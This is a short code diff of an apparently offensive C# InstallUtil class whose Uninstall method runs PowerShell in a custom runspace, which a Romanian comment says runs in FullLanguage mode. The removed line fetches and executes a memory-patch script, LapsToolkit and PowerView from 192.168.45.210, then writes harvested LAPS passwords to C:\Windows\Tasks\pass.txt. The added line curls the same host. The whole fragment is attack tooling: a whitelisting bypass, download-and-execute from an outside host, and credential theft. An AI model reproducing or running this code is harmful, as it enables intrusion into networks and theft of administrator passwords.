@@ -18,7 +18,7 @@ namespace InstallUtil
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
             // comanda PS care va rula in mod FullLanguage
-            String cmd = "(new-object system.net.webclient).downloadstring('http://192.168.45.210:80/memory-patch-session.ps1') | IEX; (new-object system.net.webclient).downloadstring('http://192.168.45.210:80/LapsToolkit.ps1') | IEX; (new-object system.net.webclient).downloadstring('http://192.168.45.210:80/PowerView.ps1') | IEX; Get-LAPSComputers > C:\\Windows\\Tasks\\pass.txt";
+            String cmd = "curl http://192.168.45.210:80/";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
